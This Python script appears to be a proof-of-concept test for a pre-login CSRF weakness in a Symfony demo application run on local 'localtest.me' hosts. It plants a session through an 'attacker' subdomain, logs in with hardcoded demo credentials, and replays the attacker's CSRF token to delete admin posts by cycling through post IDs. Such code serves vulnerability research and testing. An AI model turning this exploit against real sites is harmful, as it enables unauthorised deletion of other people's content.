import requests
from bs4 import BeautifulSoup
import random


TARGET = 'http://localtest.me/'
ATTACKER = 'http://attack.localtest.me/'
PRIVATE_KEY = './server/localtest.me.crt'
USER1 = 'jane_admin'
### USER2 login is broken
# USER2 = 'john_user'
USER2 = 'jane_admin'
PASSWORD = "kitten"


def get_csrf_token(page):
    return BeautifulSoup(page, 'html.parser').find(id="csrf_token").attrs['value']

def get_csrf_token_login(page):
    return BeautifulSoup(page, 'html.parser').find("input", {"name": "_csrf_token"}).attrs['value']

def csrf_check_symfony(csrf_token, post_id = 1):
    return s.post(TARGET + f'en/admin/post/{post_id}/delete', data = {'token' : csrf_token})

def login_symfony(id):
    r = s.get(TARGET + 'en/admin/post/')
    assert 'Try either of the following users' in r.text

    csrf_token = get_csrf_token_login(r.text)
    r = s.post(TARGET + 'en/login', data = {'_csrf_token' : csrf_token, '_username' : id, '_password' : PASSWORD})

    assert f'Post list' in r.text
    
    return r

def logout_symfony():
    r = s.get(TARGET + 'en/logout')
    assert 'Browse the <strong>admin backend</strong> of the demo application.' in r.text


with requests.Session() as s:
    print("[+] Testing pre-login CSRF attack")

    r_target = s.get(TARGET, verify = PRIVATE_KEY)
    assert 'Browse the <strong>admin backend</strong> of the demo application.' in r_target.text

    ### Attacker Setting Pre-Session
    s.get(ATTACKER, verify = PRIVATE_KEY)
    r_attacker = s.get(ATTACKER + 'set_pre_session')

    ### TARGET LOGIN
    r_target = login_symfony(USER2)

    ### ATTACKER Succeeds in deleting the post that is a CSRF protected operation for jane_admin
    csrf_token_attacker = get_csrf_token(r_attacker.text)

    for i in range(100):
        r_attacker = csrf_check_symfony(csrf_token_attacker, i)
        try:
            assert f'Post deleted successfully!' in r_attacker.text, "NOT VULNERABLE to pre-login CSRF attack"
            print(f"Deleted post id = {i}")
            break
        except:
            continue
    
    if i < 99:
        print("  - Vulnerable to pre-login CSRF attack")
    else:
        print("NOT VULNERABLE to pre-login CSRF attack")

